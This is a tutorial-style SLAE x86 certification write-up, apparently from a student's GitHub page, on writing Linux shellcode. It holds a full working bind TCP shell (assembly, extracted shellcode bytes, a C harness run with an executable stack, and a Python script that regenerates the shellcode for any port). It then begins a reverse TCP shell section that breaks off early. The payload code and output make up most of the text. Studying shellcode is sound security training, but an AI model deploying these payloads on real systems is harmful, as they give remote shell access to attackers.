# Student ID: PA-26791
### [Source code for assignments can be found here](https://github.com/CryptoBreach/SLAEx86)
# Assignments

[Assignment 1: Bind TCP Shell](#assignment-1)

[Assignment 2: Reverse TCP Shell](#assignment-2)

[Assignment 3: Egghunter](#assignment-3)

[Assignment 4: Custom Encoder/Decoder](#assignment-4)

[Assignment 5: Malware Analysis](#assignment-5)

[Assignment 6: Shellstorm Polymorphism](#assignment-6)

[Assignment 7: Custom Crypter](#assignment-7)


## Disclaimer

- Be aware I have created each writeup as standalone projects, you don't have to read one to understand another.
- Don't feel like you have to read it in order, each individual writeup will contain all the information for the topic.
- If you're just looking for the completed shellcode you can find it on my [github](https://github.com/CryptoBreach) or near the end of each assignment.


# Assignment 1

# Bind TCP Shell Requirements

- Create Bind Shell TCP shellcode
- Reverse connects to configured PORT
- Execs Shell on successful connection
- Port should be easily configurable

## Context
Have you ever generated shellcode with tools like Metasploit and MSFvenom? 
If you have, I'm sure you've wondered what that shellcode actually translates to beyond the generic descriptor "linux/x86/shell_bind_tcp".

I'm going to teach you how to not only read shellcode, but create your own as well.


## Prerequisites

- Basic understanding of registers
- Basic understanding of stack and memory
- Basic understanding of assembly


## Approach

There are dozens of approaches you could take to create shellcode, but before we create it, we first need to need to understand how it works. 
To better understand what's happening, we're going to reverse enginner and analyze it.

```markdown
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/working/4-testShellcode# msfvenom --arch x86 --platform linux --payload linux/x86/shell_bind_tcp R | ndisasm -u -
No encoder specified, outputting raw payload
Payload size: 78 bytes

00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  5B                pop ebx
00000010  5E                pop esi
00000011  52                push edx
00000012  680200115C        push dword 0x5c110002
00000017  6A10              push byte +0x10
00000019  51                push ecx
0000001A  50                push eax
0000001B  89E1              mov ecx,esp
0000001D  6A66              push byte +0x66
0000001F  58                pop eax
00000020  CD80              int 0x80
00000022  894104            mov [ecx+0x4],eax
00000025  B304              mov bl,0x4
00000027  B066              mov al,0x66
00000029  CD80              int 0x80
0000002B  43                inc ebx
0000002C  B066              mov al,0x66
0000002E  CD80              int 0x80
00000030  93                xchg eax,ebx
00000031  59                pop ecx
00000032  6A3F              push byte +0x3f
00000034  58                pop eax
00000035  CD80              int 0x80
00000037  49                dec ecx
00000038  79F8              jns 0x32
0000003A  682F2F7368        push dword 0x68732f2f
0000003F  682F62696E        push dword 0x6e69622f
00000044  89E3              mov ebx,esp
00000046  50                push eax
00000047  53                push ebx
00000048  89E1              mov ecx,esp
0000004A  B00B              mov al,0xb
0000004C  CD80              int 0x80
```


## Analyzing the output

Now if you're not experienced with assembly, I'm sure your very confused right now. 
That's alright though, we're going to learn what all this means.
Let's start from the top, where the first "int 0x80" instruction is passed. 
int 0x80 is the assembly language instruction that is used to invoke system calls in Linux on x86 (i.e., Intel-compatible) processors.
So now we understand the shellcode is making multiple syscalls!

You can read more about interrupts [here](http://www.linfo.org/int_0x80.html)

## Syscalls

If you didn't know what a syscall is, at a very high level you could say a system call is the fundamental interface between an application and the Linux kernel.

You can read more about syscalls [here](https://man7.org/linux/man-pages/man2/syscalls.2.html)

So conintuing on with the shellcode, moving up 1 position we see the instruction "mov al,0x66". If we convert that frox hexadecimal to decimal we get 102. Every syscall has an integer assigned to it so it can be identified and processed as it's specific function. If we inspect "/usr/include/i386-linux-gnu/asm/unistd_32.h" we can see syscall (102) points to "socketcall".

```
#define __NR_socketcall         102
#define __NR_syslog             103
#define __NR_setitimer          104
#define __NR_getitimer          105
#define __NR_stat               106
#define __NR_lstat              107
#define __NR_fstat              108
#define __NR_olduname           109
#define __NR_iopl               110
#define __NR_vhangup            111
#define __NR_idle               112
#define __NR_vm86old            113
```


## What is a socketcall? 

Well put simply, it's a common kernel entry point for socket system calls. 

If we read the documentation [here](https://man7.org/linux/man-pages/man2/socketcall.2.html) we can see it takes 2 parameters:
socketcall(int call, unsigned long *args). 

This is important to know for when we replicate this syscall. When you're working with assembly, you need to make sure you invoke everything correctly. 

If we read the documentation we can see it takes the socket function as the first parameter, this means that it's deciding how to invoke it.

Let's keep a note of everything we now known about this syscall and move on.


## Syscalls in shellcode

If you go through the shellcode you'll see 6 syscalls happening. If you were to analyze how each function works along with their parameters, well it would take a long time. So I've saved you the trouble and compiled a list of each syscall being invoked in order of when they appear.

```
1. socketcall(SYS_SOCKET, (AF_INET, SOCK_STREAM, 0))
2. socketcalll(SYS_BIND,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT(4444),len(16 bytes)))
3. socketcall(SYS_LISTEN, sockfd)
4. socketcall(SYS_ACCEPT, (sockfd)
5. dup2(acceptFD, (0x2,0x1,0x0))
6. execve(/bin//sh0x00)
```

Now I encourage you to actually go through the documentation of each so you have a fundamental understanding of what's actually happening.
You can find the documentation for each below:

```
1. https://man7.org/linux/man-pages/man2/socketcall.2.html
2. https://man7.org/linux/man-pages/man2/bind.2.html
3. https://man7.org/linux/man-pages/man2/listen.2.html
4. https://man7.org/linux/man-pages/man2/accept.2.html
5. https://man7.org/linux/man-pages/man2/dup.2.html
6. https://man7.org/linux/man-pages/man2/execve.2.html
```

If you're just looking for a quick and dirty explanation I've got you covered too.

```
1. socketcall(SYS_SOCKET) creates a kernel entry point for socket system calls
2. socketcall(SYS_BIND) assigns an address to a socket referred to by the sockfd file descriptor
3. socketcall(SYS_LISTEN) marks the socket as passive, meaning it will be used to accept incoming connection requests using accept().
4. socketcall(SYS_ACCEPT) extracts the connection request for the listening socket and creates a new connected socket. The newly created socket is not in the listening state.
5. dup2(sockfd,*) creates a copy of the file descriptor and uses the new specified file descriptor
6. execve(/bin//sh0x00) executes the program referred to by pathname, which in this case is "/bin//sh"
```

Now that we know all the syscalls a simple shell-bind-tcp is making, we can replicate it in our own assembly code!


## Creating our own socket()

If you can remember, "socketcall(SYS_SOCKET)" is reponsible for the creation of a socket, which is our first step in creating this bind shell.

This can be achieved with the syscall "socketcall(SYS_SOCKET, (AF_INET, SOCK_STREAM, 0))".

In assembly that looks like this:
Note: I've added comments to show how each instruction interacts with the syscall.
```
 ; [+] Setting up socketcall() for SYS_SOCKET
        ; int socketcall(int call, unsigned long *args)
        ; int socket(int domain, int type, int protocol)
        ; EAX = socketcall()
        ; EBX = SYS_SOCKET[1]
        ; ECX = (int domain, int type, int protocol)
        xor    eax,eax  ;
        mov    al,0x66  ; setting syscall as socketcall() [REF1]
        xor    ebx,ebx  ;
        push   ebx      ; setting ECX param in memory - 0x0 (0 for tcp(7) stream sockets)       :       [socket_struct --> REF3]
        inc    ebx      ; setting EBX 0x1 (socketcall: SYS_SOCKET[1])                           :       [socketCall_struct --> REF4]
        push   ebx      ; setting ECX param in memory - 0x1,0x0 (socket: SOCK_STREAM[1])        :       [socket --> REF2]
        push   0x2      ; setting ECX param in memory - 0x2,0x1,0x0 (socket: AF_INET[2])        :       [socket --> REF2]
        mov    ecx,esp  ; ECX points to args on stack for socket()                              :       [socket_struct --> REF3]
        int    0x80     ; calling socketcalll(SYS_SOCKET, (socket(AF_INET, SOCK_STREAM, 0))
	xor    esi,esi	;
	mov    esi,eax 	; save sockfd in ESI for future syscalls
```

## Attaching the bind() property to our socket

Now that we have our socket, let's go ahead and bind it to an address. In this case we want to bind it to sin_port (port) 4444.

This can be achieved with the syscall "socketcalll(SYS_BIND,(sockfd,(socketArgs, 4444),addrlen(4444))".

In assembly that looks like this:
```
; [+] Setting up socketcall() for SYS_BIND
        ; int socketcall(int call, unsigned long *args)
        ; int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
        ; EAX = socketcall
        ; EBX = SYS_BIND[2]
        ; ECX = (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
        mov    al,0x66  ; setting syscall as socketcall()
        pop    ebx      ; setting EBX to 0x2 (socketcall: SYS_BIND[2])                          :       [socketcall --> REF1]
        pop    edx      ; removing 0x1 from stack
        xor    edx,edx  ;
        push   edx      ; setting ECX param in memory - NULLBREAK
        push   word 0x5c11      ; setting ECX param in memory - 0x5c11,0x00 (PORT)              :       [bind --> REF5]
        push   0x10     ; setting ECX in memory - 0x10 is 16 bytes - 0x10,0x5c11,0x00           :       [bind --> REF5]
        push   ecx      ; setting ECX in memory - *SYS_SOCKET-struct,0x10,0x5c11,0x00           :       [bind --> REF5] 
        push   esi      ; pushing socket fd onto stack  (SYS_SOCKET-sockfd)                     :       [bind --> REF5]
        mov    ecx,esp  ; save pointer of BIND args into ecx                                    :       [bind --> REF5]
        int    0x80     ; calling socketcalll(SYS_BIND,(sockfd, sockaddr(4444), addrlen(16 bytes))
```


## Listening on our socket
To actually accept connections, we first need to listen on the socket. Let's do just that.

This can be achieved with the syscall "socketcall(SYS_LISTEN, sockfd)":

In assembly that looks like this:
```
; [+] socketcall() to SYS_LISTEN
        ; int socketcall(int call, unsigned long *args)
        ; int listen(int sockfd, int backlog)
        ; EAX = socketcall
        ; EBX = SYS_LISTEN[4]
        ; ECX = ADDRESS-SYS_BIND-SOCKFD
        mov    al,0x66  ; setting EAX to socketcall() syscall
        mov    bl,0x4   ; setting EBX to 0x4 (socketcall: SYS_LISTEN[4])                        :       [socketcall --> REF1]
        push   esi      ; pushing socket fd onto stack for ECX (sockfd)              :       [listen --> REF6]
        xor    ecx,ecx  ;
        mov    ecx,esp  ; setting ECX to pointer of SYS_SOCKET procedure - (sockfd) :       [listen --> REF6]
        int    0x80     ; [*] Calling: socketcall(SYS_LISTEN, (sockfd)
```


## Accepting incoming connections

Picture this: You invite your friend over to hang out, you've bought food and driks, you've spent a good deal of time planning it. When your friend finally arrives tries he enter but, oh no! The door is locked! This is alright though, because you can just unlock the door and let him in.

Although a broad and not entirely accurate analogy, this is in theory what we need to occur. When we recieve a connection, we want to accept it to get a shell.

This can be achieved with the syscall "socketcall(SYS_ACCEPT)".

In assmebly that looks like this:
```
sys_accept:
        ; [+] socketcall() to SYS_ACCEPT
        ; int socketcall(int call, unsigned long *args)
        ; int accept(int sockfd, struct sockaddr *restrict addr, socklen_t *restrict addrlen)
        ; EAX = socketcall
        ; EBX = SYS_ACCEPT[5]
        ; ECX = ADDRESS-SYS_BIND-SOCKFD
        mov    al,0x66  ; setting EAX to socketcall() syscall
        mov bl,0x5      ; setting EBX to 0x2 (socketcall: SYS_ACCEPT[5])                        :       [socketcall --> REF1]
        push esi        ; pushing socket fd onto stack for ECX (SYS_SOCKET-sockfd)
        mov ecx,esp     ; setting ECX to pointer of SYS_SOCKET procedure - (*SYS_SOCKET-SOCKFD) :       [accept --> REF7]
        int 0x80        ; [*] Calling: socketcall(SYS_ACCEPT, (*SYS_SOCKET-sockfd)
```

## Setting stdin, stdout and stderr

So with most in not all *NIX systems, you have: stdin, stdout and stderr. The way systems interperet it is as integers: 0x0, 0x1, 0x2.
These 3 determine the accepted data streams. It's imperative that our shell accepts all 3 streams, so let's go ahead and do just that!

This can be achieved with the syscall "dup2(sockfd,(stderr,stdout,stdin))".

In assmebly that looks like this:
```
; [+] dup2(): replacing accept fd with stdin, stdout, stderr fd's: (0x2,0x1,0x0)
        ; int dup2(int oldfd, int newfd);
        ; EAX = dup2
        ; EBX = acceptfd
        ; ECX = (0x2,0x1,0x0)-1) decrementing loop
        xor ebx,ebx     ;
        mov ebx,eax     ; After accept connection, save acceptfd to EBX (SYS_ACCEPT-ACCEPTFD)   
        xor ecx,ecx     ; 
        mov cl,0x2      ; loop counter for dup2. decrementing loop will look like: (0x2,0x1,0x00)
        dup2_loop:
        push   0x3f     ; using push/pop this time for fun. same as using mov eax,0x3f
        pop    eax      ; setting EAX to dup2() syscall                                         :       [dup2 --> REF8]
        int    0x80     ; [*] Calling: dup2(acceptFD, (0x2,0x1,0x0))
        dec    ecx      ; decrementing loop counter for each iteration
        jns    dup2_loop;  loop up to dup2_loop if not sign (If ECX is positive (0,1,2) then loop, else if negative (0,-1 etc) then continue down)
```

## Our shell

We've got all our pieces in place now, all we need is to execute a shell on connection! 

This can be achieved with the syscall "execve(/bin//sh0x00)".

I think a nice simple "/bin/sh" will work perfectly for our needs.

In assmebly that looks like this:

```
ExecveShell:
        ; [+] execve(): executing /bin//sh      
        ; int execve(const char *pathname, char *const argv[], char *const envp[])
        ; EAX = execve
        ; EBX = /bin//sh
        ; ECX = args followed by 0x00
        xor    eax,eax  ;
        mov    al,11    ; setting EAX to execve syscall
        xor    ebx,ebx  ;
        push   ebx      ; execve requires NULLBYTE after arguments (0x00)                       :       [execve --> REF9]
        push   0x68732f2f ; sh//
        push   0x6e69622f ; nib/ - Pushing /bin//sh onto stack in reverse for EBX               :       [execve --> REF9]
        mov    ebx,esp  ; setting EBX to address of /bin//sh
        xor    ecx,ecx
        xor    esi,esi
        int    0x80     ; [*] Calling: execve(/bin//sh0x00)
```

## Putting it all together

If you followed all the steps you should have an assembly file that looks similar to this:

```
global _start

section .text

_start:
;sys_socket:
	; [+] Setting up socketcall() for SYS_SOCKET
	; int socketcall(int call, unsigned long *args)
	; int socket(int domain, int type, int protocol)
	; EAX = socketcall()
	; EBX = SYS_SOCKET[1]
	; ECX = (int domain, int type, int protocol)
	xor    eax,eax	;
	mov    al,0x66	; setting syscall as socketcall() [REF1]
	xor    ebx,ebx	;
	push   ebx	; setting ECX param in memory - 0x0 (0 for tcp(7) stream sockets)	:	[socket_struct --> REF3]
	inc    ebx	; setting EBX 0x1 (socketcall: SYS_SOCKET[1]) 				:	[socketCall_struct --> REF4]
	push   ebx	; setting ECX param in memory - 0x1,0x0 (socket: SOCK_STREAM[1]) 	:	[socket --> REF2]
	push   0x2	; setting ECX param in memory - 0x2,0x1,0x0 (socket: AF_INET[2])	:	[socket --> REF2]
	mov    ecx,esp	; ECX points to args on stack for socket() 				:	[socket_struct --> REF3]
	int    0x80	; calling socketcalll(SYS_SOCKET, (socket(AF_INET, SOCK_STREAM, 0))	


save_sockfd:
	xor esi,esi	;
	mov esi,eax 	; save sockfd in ESI for future syscalls


sys_bind:
	; [+] Setting up socketcall() for SYS_BIND
	; int socketcall(int call, unsigned long *args)
	; int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	; EAX = socketcall
	; EBX = SYS_BIND[2]
	; ECX = (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	mov    al,0x66	; setting syscall as socketcall()
	pop    ebx	; setting EBX to 0x2 (socketcall: SYS_BIND[2])				:	[socketcall --> REF1]
	pop    edx	; removing 0x1 from stack
	xor    edx,edx	;
	push   edx	; setting ECX param in memory - NULLBREAK
	push   word 0x5c11	; setting ECX param in memory - 0x5c11,0x00 (PORT)		:	[bind --> REF5]
	push   0x10	; setting ECX in memory - 0x10 is 16 bytes - 0x10,0x5c11,0x00		:	[bind --> REF5]
	push   ecx	; setting ECX in memory - *SYS_SOCKET-struct,0x10,0x5c11,0x00		:	[bind --> REF5]	
	push   esi	; pushing socket fd onto stack  (SYS_SOCKET-sockfd)			: 	[bind --> REF5]
	mov    ecx,esp	; save pointer of BIND args into ecx					:	[bind --> REF5]
	int    0x80	; calling socketcalll(SYS_BIND,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT,len(16),4444))


sys_listen:
	; [+] socketcall() to SYS_LISTEN
	; int socketcall(int call, unsigned long *args)
	; int listen(int sockfd, int backlog)
	; EAX = socketcall
	; EBX = SYS_LISTEN[4]
	; ECX = ADDRESS-SYS_BIND-SOCKFD
	mov    al,0x66  ; setting EAX to socketcall() syscall
	mov    bl,0x4	; setting EBX to 0x4 (socketcall: SYS_LISTEN[4])			:	[socketcall --> REF1]
	push   esi	; pushing socket fd onto stack for ECX (SYS_SOCKET-sockfd)		:	[listen --> REF6]
	xor    ecx,ecx	;
	mov    ecx,esp	; setting ECX to pointer of SYS_SOCKET procedure - (*SYS_SOCKET-SOCKFD)	:	[listen --> REF6]
	int    0x80	; [*] Calling: socketcall(SYS_LISTEN, (*SYS_SOCKET-sockfd)


sys_accept:
	; [+] socketcall() to SYS_ACCEPT
	; int socketcall(int call, unsigned long *args)
	; int accept(int sockfd, struct sockaddr *restrict addr, socklen_t *restrict addrlen)
	; EAX = socketcall
	; EBX = SYS_ACCEPT[5]
	; ECX = ADDRESS-SYS_BIND-SOCKFD
	mov    al,0x66	; setting EAX to socketcall() syscall
	mov bl,0x5	; setting EBX to 0x2 (socketcall: SYS_ACCEPT[5])			:	[socketcall --> REF1]
	push esi	; pushing socket fd onto stack for ECX (SYS_SOCKET-sockfd)
	mov ecx,esp	; setting ECX to pointer of SYS_SOCKET procedure - (*SYS_SOCKET-SOCKFD)	:	[accept --> REF7]
	int 0x80	; [*] Calling: socketcall(SYS_ACCEPT, (*SYS_SOCKET-sockfd)


dup2_setup:
	; [+] dup2(): replacing accept fd with stdin, stdout, stderr fd's: (0x2,0x1,0x0)
	; int dup2(int oldfd, int newfd);
	; EAX = dup2
	; EBX = acceptfd
	; ECX = (0x2,0x1,0x0)-1) decrementing loop
	xor ebx,ebx	;
	mov ebx,eax	; After accept connection, save acceptfd to EBX (SYS_ACCEPT-ACCEPTFD)	
	xor ecx,ecx	; 
	mov cl,0x2	; loop counter for dup2. decrementing loop will look like: (0x2,0x1,0x00)
dup2_loop:
	push   0x3f	; using push/pop this time for fun. same as using mov eax,0x3f
	pop    eax	; setting EAX to dup2() syscall						:	[dup2 --> REF8]
	int    0x80	; [*] Calling: dup2(acceptFD, (0x2,0x1,0x0))
	dec    ecx	; decrementing loop counter for each iteration
	jns    dup2_loop;  loop up to dup2_loop if not sign (If ECX is positive (0,1,2) then loop, else if negative (0,-1 etc) then continue down)


ExecveShell:
	; [+] execve(): executing /bin//sh	
	; int execve(const char *pathname, char *const argv[], char *const envp[])
	; EAX = execve
	; EBX = /bin//sh
	; ECX = args followed by 0x00
	xor    eax,eax	;
	mov    al,11	; setting EAX to execve syscall
	xor    ebx,ebx	;
	push   ebx	; execve requires NULLBYTE after arguments (0x00)			:	[execve --> REF9]
	push   0x68732f2f ; sh//
	push   0x6e69622f ; nib/ - Pushing /bin//sh onto stack in reverse for EBX		:	[execve --> REF9]
	mov    ebx,esp	; setting EBX to address of /bin//sh
	xor    ecx,ecx
	xor    esi,esi
	int    0x80	; [*] Calling: execve(/bin//sh0x00)
```

If you didn't you do now!

For your own sake, make sure you read over it and fully understand it. It'll help you to understand how it works on a fundamental level.


## Testing our bind shell

So if you're not aware we can't just run assembly from the file, it first needs to be compile and then linked.

During my testing I went ahead and created a file that foes all this along with dumping the shellcode of the compiled file. Please use it to compile your assembly file:
```
# This compiles your assembly code and dumps the shellcode 

# Compile and output
nasm -f elf32 -o $1.o $1.asm; ld -d -o $1 $1.o

# Gets shellcode from output file

## Prints the shellcode in little endian

RAW=$(objdump -d "$1" | grep "^ "|awk -F"[\t]" '{print $2}')
SHELLCODE=""
COUNT=0
for word in $RAW
do
	SHELLCODE=${SHELLCODE}${word:6:2}${word:4:2}${word:2:2}${word:0:2}
	((COUNT++))
done
echo ""
echo "Shellcode: "
echo $SHELLCODE | sed 's/ //g'| sed 's/.\{2\}/\\x&/g'|paste -d '' -s
echo "Shellcode size: ${COUNT} bytes"
```


You then pass the name (NOT INCLUDING EXTENSION) as an argument to the bash file to compile and link it like so:
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# ./compile-shell-dump.sh bind_shell_tcp

Shellcode: 
\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x31\xf6\x89\xc6\xb0\x66\x5b\x5a\x31\xd2\x52\x66\x68\x11\x5c\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x31\xc9\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x56\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xf6\xcd\x80
Shellcode size: 99 bytes
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# ls
bind_shell_tcp  bind_shell_tcp.asm  bind_shell_tcp.o  compile-shell-dump.sh
```


Now we'll take the dumped shellcode and place it in a C file, we do this to confirm it works in a C program.
```
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x31\xf6\x89\xc6\xb0\x66\x5b\x5a\x31\xd2\x52\x66\x68\x11\x5c\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x31\xc9\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x56\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xf6\xcd\x80";

main(){

	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

Once that's done we're going to need to compile it:
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# gcc -fno-stack-protector -z execstack testingShellcode.c -o testingShellcode
```

And we're done!

## Testing our shell

To test our shell we'll execute our C file, don't be alarmed if it hangs, it should be doing that as it's waiting for a connection:
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# ./testingShellcode
Shellcode Length: 99

```

Now in another terminal we check that the port is running, and it is!:
```
root@ubuntu:/home/ubuntu# netstat -antp | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      4917/testingShellco
```

All that's left to test is the accept and execve syscalls...
```
root@ubuntu:/home/ubuntu# nc 127.0.0.1 4444
```


It works! We've successfully created a shell-bind-tcp from scratch!
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/working/4-testShellcode# ./testingShellcode
Shellcode Length: 99
# 
```

I hope you enjoyed learning how to create a simple shell-bind-tcp using shellcode!

As an added bonus, I've included a python script that allows you to dynamically restructure shellcode to allow for the swapping of ports.

```
#!/usr/bin/python
import sys
    
if len(sys.argv) != 2:
  print "Please enter port number..."
  sys.exit()
    
port_number     = int(sys.argv[1])
bts             = [port_number >> i & 0xff for i in (24,16,8,0)]
Filter        = [b for b in bts if b > 0]
Format       = ["\\x" + format(b, 'x') for b in Filter]
PostJoining          = "".join(Format)
    
oldShellcode ="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1"
oldShellcode +="\\xcd\\x80\\x31\\xff\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x02\\x31\\xc9"
oldShellcode +="\\x51\\x66\\x68" + PostJoining + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57"
oldShellcode +="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x04\\x31\\xc9\\x51\\x57"
oldShellcode +="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x05\\x31\\xc9\\x51\\x51"
oldShellcode +="\\x57\\x89\\xe1\\xcd\\x80\\x31\\xdb\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd"
oldShellcode +="\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f\\x2f\\x73\\x68"
oldShellcode +="\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
    
print("\nShellcode with port " + str(port_number) + " is: " + oldShellcode)
```
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# python port-changer.py 4444

Shellcode with port 4444 is: \x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/working/4-testShellcode# cat port-changer.py
```


# Assignment 2
# Reverse TCP Shell Requirements
- Create Reverse Shell TCP shellcode
- Reverse connects to configured IP and PORT
- Execs Shell on successful connection
- IP and Port should be easily configurable

## Context
Have you ever generated shellcode with tools like Metasploit and MSFvenom? 
If you have, I'm sure you've wondered what that shellcode actually translates to beyond the generic descriptor "linux/x86/shell_bind_tcp".

I'm going to teach you how to not only read shellcode, but create your own as well.

## Approach
There are dozens of approaches you could take to create shellcode, but before we create it, we first need to need to understand how it works. 
To better understand what's happening, we're going to reverse enginner and analyze it.

```
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment# msfvenom --arch x86 --platform linux -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 port=4444 | ndisasm -u -
No encoder specified, outputting raw payload
Payload size: 68 bytes

00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  93                xchg eax,ebx
00000010  59                pop ecx
00000011  B03F              mov al,0x3f
00000013  CD80              int 0x80
00000015  49                dec ecx
00000016  79F9              jns 0x11
00000018  687F000001        push dword 0x100007f
0000001D  680200115C        push dword 0x5c110002
00000022  89E1              mov ecx,esp
00000024  B066              mov al,0x66
00000026  50                push eax
00000027  51                push ecx
00000028  53                push ebx
00000029  B303              mov bl,0x3
0000002B  89E1              mov ecx,esp
0000002D  CD80              int 0x80
0000002F  52                push edx
00000030  686E2F7368        push dword 0x68732f6e
00000035  682F2F6269        push dword 0x69622f2f
0000003A  89E3              mov ebx,esp
0000003C  52                push edx
0000003D  53                push ebx
0000003E  89E1              mov ecx,esp
00000040  B00B              mov al,0xb
00000042  CD80              int 0x80
```


## Analyzing the output

Now if you're not experienced with assembly, I'm sure your very confused right now. 
That's alright though, we're going to learn what all this means.
Let's start from the top, where the first "int 0x80" instruction is passed. 
int 0x80 is the assembly language instruction that is used to invoke system calls in Linux on x86 (i.e., Intel-compatible) processors.
So now we understand the shellcode is making multiple syscalls!

You can read more about interrupts [here](http://www.linfo.org/int_0x80.html)

## Syscalls

If you didn't know what a syscall is, at a very high level you could say a system call is the fundamental interface between an application and the Linux kernel.

You can read more about syscalls [here](https://man7.org/linux/man-pages/man2/syscalls.2.html)

So conintuing on with the shellcode, moving up 1 position we see the instruction "mov al,0x66". If we convert that frox hexadecimal to decimal we get 102. Every syscall has an integer assigned to it so it can be identified and processed as it's specific function. If we inspect "/usr/include/i386-linux-gnu/asm/unistd_32.h" we can see syscall (102) points to "socketcall".

```
#define __NR_socketcall         102
#define __NR_syslog             103
#define __NR_setitimer          104
#define __NR_getitimer          105
#define __NR_stat               106
#define __NR_lstat              107
#define __NR_fstat              108
#define __NR_olduname           109
#define __NR_iopl               110
#define __NR_vhangup            111
#define __NR_idle               112
#define __NR_vm86old            113
```

## What is a socketcall? 

Well put simply, it's a common kernel entry point for socket system calls. 

If we read the documentation [here](https://man7.org/linux/man-pages/man2/socketcall.2.html) we can see it takes 2 parameters:
socketcall(int call, unsigned long *args). 

This is important to know for when we replicate this syscall. When you're working with assembly, you need to make sure you invoke everything correctly. 

If we read the documentation we can see it takes the socket function as the first parameter, this means that it's deciding how to invoke it.

Let's keep a note of everything we now known about this syscall and move on.


## Syscalls in shellcode

If you go through the shellcode you'll see 6 syscalls happening. If you were to analyze how each function works along with their parameters, well it would take a long time. So I've saved you the trouble and compiled a list of each syscall being invoked in order of when they appear.

```
1. socketcall(SYS_SOCKET, (AF_INET, SOCK_STREAM, 0))
2. socketcalll(SYS_CONNECT,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT(127.0.0.1,4444),len(16 bytes)))
3. dup2(acceptFD, (0x2,0x1,0x0))
4. execve(/bin//sh0x00)
```

Now I encourage you to actually go through the documentation of each so you have a fundamental understanding of what's actually happening.
You can find the documentation for each below:

```
1. https://man7.org/linux/man-pages/man2/socketcall.2.html
2. https://man7.org/linux/man-pages/man2/bind.2.html
3. https://man7.org/linux/man-pages/man2/dup.2.html
4. https://man7.org/linux/man-pages/man2/execve.2.html
```

If you're just looking for a quick and dirty explanation I've got you covered too.

```
1. socketcall(SYS_SOCKET) creates a kernel entry point for socket system calls
2. socketcall(SYS_CONNECT) connects a socket with a specified address (IP,PORT)
4. dup2(sockfd,*) creates a copy of the file descriptor and uses the new specified file descriptor
5. execve(/bin//sh0x00) executes the program referred to by pathname, which in this case is "/bin//sh"
```

Now that we know all the syscalls a simple shell-bind-tcp is making, we can replicate it in our own assembly code!

## Creating our own socket()

